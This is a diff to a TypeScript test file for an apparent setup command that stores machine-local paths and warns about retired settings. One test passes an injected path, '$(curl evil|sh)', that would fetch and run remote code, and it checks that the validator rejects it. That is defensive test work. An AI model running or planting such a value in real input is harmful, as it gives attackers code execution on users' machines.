@@ -16,6 +16,19 @@ vi.mock('../core/index.js', async () => {
   };
 });
 
+const { setMachinePathSpy } = vi.hoisted(() => ({
+  setMachinePathSpy: vi.fn((_key: string, value = '') => value),
+}));
+vi.mock('../core/local-config.js', async (importOriginal) => {
+  const actual = await importOriginal<typeof import('../core/local-config.js')>();
+  return {
+    MACHINE_PATH_KEYS: ['issueListPath', 'skippedIssuesPath'],
+    // Real check: a path with a shell metacharacter is refused before anything is set (#1934).
+    assertSafeMachinePath: actual.assertSafeMachinePath,
+    setMachinePath: setMachinePathSpy,
+  };
+});
+
 vi.mock('./validation.js', () => ({
   validateGitHubUsername: vi.fn(),
 }));
@@ -353,14 +366,35 @@ describe('runSetup', () => {
   it('should set skippedIssuesPath', async () => {
     const result = (await runSetup({ set: ['skippedIssuesPath=/tmp/skip.txt'] })) as SetupSetOutput;
 
-    expect(mockUpdateConfig).toHaveBeenCalledWith({ skippedIssuesPath: '/tmp/skip.txt' });
+    expect(setMachinePathSpy).toHaveBeenCalledWith('skippedIssuesPath', '/tmp/skip.txt');
+    expect(mockUpdateConfig).not.toHaveBeenCalled();
     expect(result.settings).toMatchObject({ skippedIssuesPath: '/tmp/skip.txt' });
+  });
+
+  it('refuses a path with a shell metacharacter before applying any setting (#1934)', async () => {
+    await expect(runSetup({ set: ['languages=go', 'issueListPath=/tmp/list$(curl evil|sh).md'] })).rejects.toThrow(
+      /a path may not contain/,
+    );
+    expect(mockUpdateConfig).not.toHaveBeenCalled();
+    expect(setMachinePathSpy).not.toHaveBeenCalled();
+  });
+
+  it('skips the Gist checkpoint when every key set is machine-local (#1950)', async () => {
+    await runSetup({ set: ['issueListPath=/tmp/list.md', 'skippedIssuesPath=/tmp/skip.txt'] });
+
+    expect(mockMaybeCheckpoint).not.toHaveBeenCalled();
+  });
+
+  it('still checkpoints when a machine-local key is set together with a synced one', async () => {
+    await runSetup({ set: ['issueListPath=/tmp/list.md', 'maxActivePRs=7'] });
+
+    expect(mockMaybeCheckpoint).toHaveBeenCalledTimes(1);
   });
 
   it('should clear skippedIssuesPath when value is empty', async () => {
     const result = (await runSetup({ set: ['skippedIssuesPath='] })) as SetupSetOutput;
 
-    expect(mockUpdateConfig).toHaveBeenCalledWith({ skippedIssuesPath: undefined });
+    expect(setMachinePathSpy).toHaveBeenCalledWith('skippedIssuesPath', undefined);
     expect(result.settings).toMatchObject({ skippedIssuesPath: '(cleared)' });
   });
 
@@ -381,6 +415,18 @@ describe('runSetup', () => {
     expect(mockUpdateConfig).toHaveBeenCalledWith({ autoFormatBeforePush: true });
     expect(result.settings).toMatchObject({ autoFormatBeforePush: 'true' });
   });
+
+  it.each(['autoFormatBeforePush=true', 'trustOwnRepoWrites=true', 'healthCheckFreshnessMinutes=45'])(
+    'stores the retired %s and warns that nothing reads it (#1948)',
+    async (pair) => {
+      const [key] = pair.split('=', 1);
+      const result = (await runSetup({ set: [pair] })) as SetupSetOutput;
+      expect(mockUpdateConfig).toHaveBeenCalledTimes(1);
+      expect(result.warnings).toContain(
+        `${key} is retired and not read by oss-autopilot; it is kept for compatibility`,
+      );
+    },
+  );
 
   it('should set autoFormatBeforePush to false', async () => {
     const result = (await runSetup({ set: ['autoFormatBeforePush=false'] })) as SetupSetOutput;
